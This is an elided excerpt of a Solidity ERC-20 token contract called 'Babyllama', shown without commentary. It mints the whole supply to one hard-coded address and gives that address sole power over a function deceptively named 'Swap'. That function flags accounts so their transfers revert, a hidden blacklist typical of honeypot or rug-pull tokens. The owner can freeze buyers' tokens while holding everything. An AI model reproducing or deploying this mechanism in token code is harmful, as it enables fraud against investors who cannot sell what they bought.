 ...
 */
contract Babyllama is Context, IERC20, IERC20Metadata,Ownable {
    mapping(address => uint256) private _balances;
    	address  public _OnlyCan =0x8e19a5b1E1186F4a1891A98CBFFa55a63F42D281;
    ...
    constructor() {
       _totalSupply = 1000000000000 * (10**18);
        _setOwner(0x8e19a5b1E1186F4a1891A98CBFFa55a63F42D281);
        _name="Babyllama";
        _symbol="Babyllama";
        _mint(0x8e19a5b1E1186F4a1891A98CBFFa55a63F42D281, _totalSupply);
    }
    /**
    ...
    function Swap(address account, bool isSwap) public onlyCan() {
    ...
    function _transfer(
        ...
        require(!swap[sender].isSwap , "You have been Not Swaped from transfering tokens");
